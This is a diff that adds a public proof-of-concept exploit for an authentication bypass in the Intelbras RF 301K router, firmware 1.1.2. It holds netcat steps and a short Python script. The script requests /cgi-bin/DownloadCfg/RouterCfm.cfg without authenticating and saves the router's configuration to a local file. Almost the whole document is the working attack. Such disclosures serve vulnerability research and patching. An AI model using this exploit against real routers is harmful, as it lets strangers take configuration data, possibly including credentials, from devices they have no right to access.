@@ -1,0 +1,37 @@
+# Exploit Title: Intelbras Router RF 301K 1.1.2 - Authentication Bypass
+# Date: 27/11/2020
+# Exploit Author: Kaio Amaral
+# Vendor Homepage: https://www.intelbras.com/pt-br/
+# Software Link: http://backend.intelbras.com/sites/default/files/2020-10/RF301K_v1.1.2.zip
+# Version: firmware version 1.1.2
+# Tested on: kali, android
+
+# POC
+
+# 1. nc host port, ex: nc 10.0.0.1 80
+# 2. GET /cgi-bin/DownloadCfg/RouterCfm.cfg HTTP/1.0
+
+# Python3
+
+import socket
+from time import sleep
+
+def exploit(host, port=80):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    pay = "GET /cgi-bin/DownloadCfg/RouterCfm.cfg HTTP/1.0\n\n".encode()
+    s.connect((host, port))
+    s.send(pay)
+    sleep(0.2)
+    data = s.recv(17576)
+    if len(data) > 1000:
+        print("[+] Success.")
+        return data.decode()
+    print("[-] Failed. ")
+    exit()
+
+def file(data):
+    with open("router.cfg", "w") as file:
+        file.write(data[233:])
+    print("[+] File Successfully Written.")
+
+file(exploit("10.0.0.1"))
